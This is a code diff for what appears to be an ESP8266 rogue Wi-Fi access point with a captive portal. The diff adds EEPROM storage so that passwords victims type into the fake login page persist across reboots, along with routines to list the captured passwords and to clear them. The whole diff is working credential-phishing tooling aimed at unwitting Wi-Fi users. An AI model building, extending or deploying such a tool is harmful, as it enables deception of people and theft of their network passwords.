@@ -29,6 +29,11 @@ String allPass = "";
 String newSSID = "";
 String currentSSID = "";
 
+// For storing passwords in EEPROM.
+int passStart = 20; // Starting location to save password.
+int passEnd=20; // Ending location to save password.
+String singlePassword=""; // For storing each password.
+
 unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
 DNSServer dnsServer; ESP8266WebServer webServer(80);
 
@@ -66,11 +71,53 @@ String index() {
 }
 
 String posted() {
-  String pass = input("m"); allPass = "<li><b>" + pass + "</b></li>" + allPass;
+  String pass = input("m");
+  singlePassword = "---" + pass;  // For separating passwords.
+
+  // Writing each passwords to EEPROM.
+  for (int i=0;i<=singlePassword.length();++i)
+  {
+    EEPROM.write(i + passEnd, singlePassword[i]);
+  }
+  passEnd += singlePassword.length(); // Updating password end position in EEPROM.
+  EEPROM.write(passEnd, '\0');
+  EEPROM.commit();
   return header(POST_TITLE) + POST_BODY + footer();
 }
 
 String pass() {
+  allPass = "";
+  int flag = 0;
+  int i = passStart;  // Password start position in EEPROM.
+
+  // Reading Saved Password from EEPROM.
+  while (EEPROM.read(i) != '\0')
+  {    
+    if (EEPROM.read(i) == '-' && EEPROM.read(i+1) == '-' && EEPROM.read(i+2) == '-')
+    {
+      i += 3;
+      if (flag == 0)
+      {
+        allPass += "<li><b>";
+      }
+      else
+      {
+        allPass += "</b></li><li><b>";
+        flag = 0;
+      }
+    }
+    else
+    {
+      allPass += char(EEPROM.read(i));
+      i++;
+      flag = 1;
+    }
+    
+  }
+  if (flag == 1)
+  {
+    allPass += "</b></li>";
+  }
   return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
 
@@ -91,6 +138,9 @@ String postedSSID() {
 
 String clear() {
   String pass = ""; allPass = "";
+  // Marking the passowrd end location.
+  EEPROM.write(passStart,'\0') ;
+  EEPROM.commit();
   return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
@@ -119,6 +169,11 @@ void setup() {
   while (EEPROM.read(i) != '\0') {
     ESSID += char(EEPROM.read(i));
     i++;
+  }
+  // Reading the end position of password in the EEPROM.
+  while (EEPROM.read(passEnd) != '\0')
+  {
+    passEnd++;
   }
   
   WiFi.mode(WIFI_AP);
